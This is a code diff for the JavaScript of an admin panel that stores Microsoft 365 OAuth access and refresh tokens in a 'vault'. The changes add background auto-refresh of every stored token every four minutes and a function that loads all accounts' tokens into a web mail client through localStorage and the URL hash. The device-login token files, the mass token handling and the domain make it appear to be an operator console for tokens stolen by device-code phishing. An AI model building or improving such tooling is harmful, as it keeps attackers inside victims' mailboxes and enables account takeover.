+          <line x1="10" y1="14" x2="21" y2="3"/>
+        </svg>
         Open in Mail Client
       </button>
     </div>
@@ -680,12 +555,14 @@ body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(v
 // CONFIG
 // ══════════════════════════════════════════════════════════════════════════
 const API = 'https://admin.swiftcourrier.online';
+const MAIL_URL = 'https://admin.swiftcourrier.online/mail';
+
 // ══════════════════════════════════════════════════════════════════════════
 // STATE
 // ══════════════════════════════════════════════════════════════════════════
-let currentAdmin    = null;
-let tokensList      = [];
-let viewingTokenId  = null;
+let currentAdmin   = null;
+let tokensList     = [];
+let viewingTokenId = null;
 
 // ══════════════════════════════════════════════════════════════════════════
 // HTTP HELPERS
@@ -711,7 +588,6 @@ async function api(method, path, body) {
     currentAdmin = data.admin;
     enterApp();
   }
-  // else: login screen stays visible
 })();
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -722,8 +598,8 @@ document.addEventListener('keydown', e => {
 });
 
 async function doLogin() {
-  const user = document.getElementById('l-user').value.trim();
-  const pass = document.getElementById('l-pass').value;
+  const user  = document.getElementById('l-user').value.trim();
+  const pass  = document.getElementById('l-pass').value;
   const errEl = document.getElementById('login-err');
   const btn   = document.getElementById('login-btn');
   errEl.classList.remove('show');
@@ -737,6 +613,7 @@ async function doLogin() {
 }
 
 async function doLogout() {
+  if (_bgRefreshTimer) clearInterval(_bgRefreshTimer);
   await api('POST', '/api/logout');
   currentAdmin = null;
   document.getElementById('app').classList.remove('ready');
@@ -751,6 +628,7 @@ function enterApp() {
   document.getElementById('top-username').textContent = currentAdmin.username;
   loadTokens();
   checkRefresherServer();
+  startBgTokenRefresh(); // Auto-refresh all tokens
 }
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -761,8 +639,177 @@ function showTab(name) {
     document.getElementById('tab-'+t).classList.toggle('hidden', t !== name);
     document.getElementById('nav-'+t).classList.toggle('active', t === name);
   });
-  if (name === 'admins') loadAdmins();
+  if (name === 'admins')   loadAdmins();
   if (name === 'settings') checkRefresherServer();
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// BACKGROUND AUTO-REFRESH — keeps every token always green
+// ══════════════════════════════════════════════════════════════════════════
+let _bgRefreshTimer   = null;
+let _bgRefreshRunning = false;
+
+function startBgTokenRefresh() {
+  if (_bgRefreshTimer) clearInterval(_bgRefreshTimer);
+  // Run immediately on login
+  refreshExpiredTokens();
+  // Then every 4 minutes
+  _bgRefreshTimer = setInterval(() => refreshExpiredTokens(), 4 * 60 * 1000);
+}
+
+async function refreshExpiredTokens(force = false) {
+  if (!currentAdmin) return;
+  if (_bgRefreshRunning && !force) return; // prevent overlapping runs
+  _bgRefreshRunning = true;
+
+  const chip  = document.getElementById('refresh-status-chip');
+  const label = document.getElementById('refresh-status-label');
+
+  try {
+    const { ok, data } = await api('GET', '/api/tokens');
+    if (!ok) return;
+
+    const tokens = (data.tokens || []).filter(t => t.has_refresh_token);
+    if (!tokens.length) return;
+
+    // Find which ones need refreshing (expired OR < 10 minutes left)
+    const now = Date.now();
+    const needRefresh = tokens.filter(t => {
+      if (!t.expires_at) return true; // no expiry info → refresh to be safe
+      const ms = new Date(t.expires_at).getTime() - now;
+      return ms < 10 * 60 * 1000; // < 10 minutes remaining
+    });
+
+    if (!needRefresh.length) return; // all tokens are healthy
+
+    // Show spinning indicator
+    if (chip)  chip.classList.add('spinning');
+    if (label) label.textContent = `Refreshing ${needRefresh.length}…`;
+
+    let refreshed = 0;
+    for (const tok of needRefresh) {
+      // Mark card as refreshing in UI
+      const card = document.getElementById('tc-' + tok.id);
+      if (card) card.classList.add('refreshing-now');
+
+      try {
+        const { ok: rOk } = await api('POST', `/api/tokens/${tok.id}/refresh`);
+        if (rOk) refreshed++;
+      } catch (_) {}
+
+      // Small delay to avoid hammering the server
+      await new Promise(r => setTimeout(r, 400));
+    }
+
+    if (refreshed > 0) {
+      const t = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+      const badge = document.getElementById('last-refresh-badge');
+      if (badge) badge.textContent = 'Last: ' + t;
+      await loadTokens(); // re-render with fresh data
+      if (force) toast(`Refreshed ${refreshed} token${refreshed > 1 ? 's' : ''}`, 'ok');
+    }
+  } catch(_) {
+    // Silently ignore network errors in background task
+  } finally {
+    _bgRefreshRunning = false;
+    if (chip)  chip.classList.remove('spinning');
+    if (label) label.textContent = 'Auto-refresh';
+  }
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// OPEN MAIL CLIENT — loads ALL vault tokens into mail.html
+// Same-origin localStorage trick: both pages share storage on admin.swiftcourrier.online
+// ══════════════════════════════════════════════════════════════════════════
+function genId() {
+  return Math.random().toString(36).slice(2, 8);
+}
+
+async function openMailClient() {
+  const btn = document.getElementById('open-mail-btn');
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML = '<span class="spin-inline"></span> Loading…';
+  }
+
+  try {
+    // 1. Get token list
+    const { ok, data } = await api('GET', '/api/tokens');
+    if (!ok || !data.tokens?.length) {
+      toast('No tokens in vault — add a token first', 'err');
+      return;
+    }
+
+    const tokens = data.tokens;
+    const accounts = [];
+
+    // 2. Fetch full token data for each (including access_token)
+    for (const tok of tokens) {
+      try {
+        const { ok: tokOk, data: tokData } = await api('GET', `/api/tokens/${tok.id}`);
+        if (!tokOk || !tokData.token?.access_token) continue;
+        const t = tokData.token;
+        const expiresAt = t.expires_at
+          ? new Date(t.expires_at).getTime()
+          : Date.now() + 3600_000;
+
+        accounts.push({
+          id:           'adm_' + tok.id,
+          email:        t.email || '',
+          name:         t.name  || (t.email ? t.email.split('@')[0] : 'Account'),
+          accessToken:  t.access_token,
+          refreshToken: t.refresh_token || null,
+          expiresAt,
+          fromAdmin:    true,
+        });
+      } catch (_) {}
+    }
+
+    if (!accounts.length) {
+      toast('Could not load any valid tokens', 'err');
+      return;
+    }
+
+    // 3. Write ALL accounts to localStorage — same origin, mail.html reads this on boot
+    try {
+      localStorage.setItem('m365_accounts_v2', JSON.stringify(accounts));
+    } catch (e) {
+      console.warn('[openMailClient] localStorage write failed:', e);
+      // Non-fatal: mail.html will still receive the first token via hash
+    }
+
+    // 4. Encode first account in URL hash — mail.html activates this immediately on load
+    const first = accounts[0];
+    const hashPayload = {
+      access_token:  first.accessToken,
+      refresh_token: first.refreshToken,
+      email:         first.email,
+      name:          first.name,
+      expires_at:    first.expiresAt ? new Date(first.expiresAt).toISOString() : null,
+    };
+
+    const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(hashPayload))));
+    window.open(MAIL_URL + '#token=' + encoded, '_blank');
+
+    const extra = accounts.length - 1;
+    toast(
+      `Mail client opened — ${first.email || 'account 1'} active` +
+      (extra > 0 ? ` · ${extra} more in account manager` : ''),
+      'ok'
+    );
+
+  } catch (e) {
+    toast('Error opening mail client: ' + e.message, 'err');
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = `<svg fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24" width="13" height="13">
+        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/>
+        <polyline points="15 3 21 3 21 9"/>
+        <line x1="10" y1="14" x2="21" y2="3"/>
+      </svg> Open Mail Client`;
+    }
+  }
 }
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -772,7 +819,10 @@ async function loadTokens() {
   const grid = document.getElementById('tokens-grid');
   grid.innerHTML = '<div style="padding:20px;text-align:center;font-family:var(--mono);font-size:11px;color:var(--sub)"><span class="spin-inline"></span>&nbsp; Loading…</div>';
   const { ok, data } = await api('GET', '/api/tokens');
-  if (!ok) { grid.innerHTML = `<div style="padding:20px;color:var(--red);font-family:var(--mono);font-size:11px">${esc(data.error||'Failed to load tokens')}</div>`; return; }
+  if (!ok) {
+    grid.innerHTML = `<div style="padding:20px;color:var(--red);font-family:var(--mono);font-size:11px">${esc(data.error||'Failed to load tokens')}</div>`;
+    return;
+  }
   tokensList = data.tokens || [];
   renderTokens();
 
@@ -801,11 +851,13 @@ function renderTokens() {
     const cardCls  = expired ? 'expired' : soon ? 'expiring-soon' : 'fresh';
     const badgeCls = expired ? 'exp' : soon ? 'soon' : 'ok';
     const badgeTxt = expired ? 'EXPIRED' : soon ? 'EXPIRING' : 'ACTIVE';
-    const expStr   = exp ? exp.toLocaleString([], { dateStyle:'medium', timeStyle:'short' }) : 'No expiry stored';
+    const expStr   = exp
+      ? exp.toLocaleString([], { dateStyle: 'medium', timeStyle: 'short' })
+      : 'No expiry stored';
     const color    = avatarColor(tok.email || tok.id);
     const ini      = initials(tok.name || tok.email || '?');
     const fileHint = tok.token_file_path
-      ? tok.token_file_path.split(/[\\/]/).pop()   // just filename
+      ? tok.token_file_path.split(/[\\/]/).pop()
       : tok.token_file_name || null;
     return `<div class="token-card ${cardCls}" id="tc-${tok.id}">
       <div class="tok-avatar" style="background:${color}">${esc(ini)}</div>
@@ -841,13 +893,16 @@ async function refreshToken(id) {
   if (btn) { btn.disabled = true; btn.innerHTML = '<span class="spin-inline"></span> Refreshing…'; }
   const { ok, data } = await api('POST', `/api/tokens/${id}/refresh`);
   if (ok) {
-    const exp  = new Date(data.expires_at).toLocaleTimeString();
+    const exp   = new Date(data.expires_at).toLocaleTimeString();
     const saved = data.file_path ? ` · saved → ${data.file_path.split(/[\\/]/).pop()}` : '';
     toast('Refreshed — expires ' + exp + saved, 'ok');
     await loadTokens();
   } else {
     toast('Refresh failed: ' + (data.error || 'Unknown error'), 'err');
-    if (btn) { btn.disabled = false; btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="12" height="12"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> Refresh'; }
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = '<svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="12" height="12"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> Refresh';
+    }
   }
 }
 
@@ -868,7 +923,7 @@ async function viewToken(id) {
       <span style="color:var(--sub)">Refresh Token</span><span style="color:var(--txt)">${esc(rtPreview)}</span>
     </div>
     <div style="margin-top:16px;padding:10px 12px;background:var(--acc-glow);border:1px solid var(--acc2);font-size:10px;color:var(--acc)">
-      // clicking "Open in Mail Client" passes this token to localmail.html (/mail) via URL hash
+      // "Open in Mail Client" opens this account in mail.html via URL hash
     </div>`;
   document.getElementById('view-token-overlay').classList.remove('hidden');
 }
@@ -877,9 +932,8 @@ async function openMailWithToken() {
   if (!viewingTokenId) return;
   const { ok, data } = await api('GET', `/api/tokens/${viewingTokenId}`);
   if (!ok) { toast('Failed to fetch token', 'err'); return; }
-  // Pass token via URL fragment (stays local, never sent to server)
-  const encoded = btoa(JSON.stringify(data.token));
-  window.open(`https://admin.swiftcourrier.online/mail#token=${encoded}`, '_blank');
+  const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data.token))));
+  window.open(MAIL_URL + '#token=' + encoded, '_blank');
   closeModal('view-token-overlay');
 }
 
@@ -892,8 +946,6 @@ function deleteToken(id, label) {
 }
 
 // ── Add token modal ──────────────────────────────────────────────────────────
-
-// Stores the full path of the loaded file so we can autosave refreshed tokens back
 let _tokFilePath = null;
 
 function openAddTokenModal() {
@@ -925,19 +977,13 @@ function readTokenFile(file) {
     document.getElementById('tok-paste').value = ev.target.result;
     document.getElementById('tok-drop-name').textContent = '✓ ' + file.name;
     document.getElementById('tok-drop-zone').classList.remove('drag-over');
-
-    // Store path info — browsers can't give full OS path for security reasons,
-    // but the tokens.json already stores its own path inside the file under token_file.
-    // We'll extract it from the parsed JSON so refresh can write back to disk.
     try {
       const parsed = JSON.parse(ev.target.result);
-      // token_file_path may be stored inside the JSON by devicelogin.js
       const embeddedPath = parsed.token_file_path || parsed.token_file || null;
       if (embeddedPath) {
         _tokFilePath = embeddedPath;
         showFilePath(embeddedPath);
       } else {
-        // No embedded path — show filename only as hint
         _tokFilePath = null;
         const pathRow = document.getElementById('tok-file-path-row');
         if (pathRow) {
@@ -980,9 +1026,7 @@ async function submitAddToken() {
     parsed = { access_token: raw };
   }
 
-  // Resolve file path: prefer manually tracked path, then embedded in JSON
   const filePath = _tokFilePath || parsed.token_file_path || parsed.token_file || null;
-
   const { ok, data } = await api('POST', '/api/tokens', {
     raw_json: JSON.stringify(parsed),
     label,
@@ -996,6 +1040,8 @@ async function submitAddToken() {
   toast(msg, 'ok');
   closeModal('add-token-overlay');
   await loadTokens();
+  // Immediately try to refresh if it has a refresh token
+  setTimeout(() => refreshExpiredTokens(), 500);
 }
 
 // ══════════════════════════════════════════════════════════════════════════
@@ -1049,10 +1095,10 @@ async function submitAddAdmin() {
 // SETTINGS — CHANGE PASSWORD
 // ══════════════════════════════════════════════════════════════════════════
 async function changePassword() {
-  const cur  = document.getElementById('s-cur').value;
-  const nw   = document.getElementById('s-new').value;
-  const nw2  = document.getElementById('s-new2').value;
-  const msg  = document.getElementById('pwd-msg');
+  const cur = document.getElementById('s-cur').value;
+  const nw  = document.getElementById('s-new').value;
+  const nw2 = document.getElementById('s-new2').value;
+  const msg = document.getElementById('pwd-msg');
   msg.className = 's-msg'; msg.textContent = '';
   if (!cur || !nw) { msg.className = 's-msg err'; msg.textContent = 'All fields are required'; return; }
   if (nw !== nw2)  { msg.className = 's-msg err'; msg.textContent = 'New passwords do not match'; return; }
@@ -1094,7 +1140,6 @@ function showConfirm(title, body, onOk) {
   document.getElementById('confirm-overlay').classList.remove('hidden');
 }
 
-// Close overlay on backdrop click
 document.querySelectorAll('.overlay').forEach(el => {
   el.addEventListener('click', e => { if (e.target === el) closeModal(el.id); });
 });
@@ -1103,7 +1148,7 @@ document.querySelectorAll('.overlay').forEach(el => {
 // TOAST
 // ══════════════════════════════════════════════════════════════════════════
 function toast(msg, type = 'info') {
-  const c = document.getElementById('toast-container');
+  const c  = document.getElementById('toast-container');
   const el = document.createElement('div');
   el.className = `toast ${type}`;
   el.innerHTML = `<div class="toast-dot"></div><span>${esc(msg)}</span>`;
@@ -1114,7 +1159,9 @@ function toast(msg, type = 'info') {
 // ══════════════════════════════════════════════════════════════════════════
 // UTILS
 // ══════════════════════════════════════════════════════════════════════════
-function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function esc(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
 
 const COLORS = ['#00c8ff','#00e878','#ff8c00','#ff4060','#b040ff','#ffcc00','#00b8a0','#4080ff'];
 function avatarColor(str) { let h=0; for(const c of String(str||'')) h=h*31+c.charCodeAt(0); return COLORS[Math.abs(h)%COLORS.length]; }
